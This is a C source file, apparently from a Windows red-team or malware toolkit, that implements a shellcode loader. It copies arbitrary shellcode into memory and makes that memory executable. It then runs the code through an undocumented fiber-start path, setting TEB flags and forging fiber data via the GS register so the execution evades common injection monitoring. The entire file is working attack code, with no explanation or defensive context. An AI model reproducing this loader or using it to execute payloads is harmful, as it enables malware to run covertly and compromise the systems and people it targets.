#include "Win32Helper.h"

typedef int(WINAPI* RtlUserFiberStart)();

DWORD ProcessInjectFiberData(_In_ PCHAR Shellcode, _In_ DWORD Length)
{
    NTSTATUS status;
    DWORD OldProt = 0;

    PTEB pTeb          = GetTeb();
    PVOID pTebFlags    = (PVOID)((UINT_PTR)pTeb + 0x17ee);
    *(PCHAR)pTebFlags  = *(PCHAR)pTebFlags | 0x4;


    HMODULE hModule = GetModuleHandleA("ntdll.dll");
    RtlUserFiberStart pRtlUserFiberStart = (RtlUserFiberStart)GetProcAddress(hModule, "RtlUserFiberStart");

    LPVOID BufferAddress = VirtualAlloc(NULL,
                                        Length, 
                                        MEM_COMMIT | MEM_RESERVE, 
                                        PAGE_READWRITE);

    RtlCopyMemory(BufferAddress, Shellcode, Length);

    status = VirtualProtect(BufferAddress,
                            Length, 
                            PAGE_EXECUTE_READ, 
                            &OldProt);

    if (status != 0) 
    {
        UINT_PTR pFiberData = (UINT_PTR)HeapAlloc(GetProcessHeap(),
                                                  HEAP_ZERO_MEMORY,
                                                  0x100);

        *(LPVOID*)(pFiberData + 0x0a8) = BufferAddress;

        __writegsqword(0x20, pFiberData);
        pRtlUserFiberStart();

        HeapFree(GetProcessHeap(), 0, (LPVOID)pFiberData);
    }

    VirtualFree(BufferAddress, Length, MEM_RELEASE);
    return 0;
}
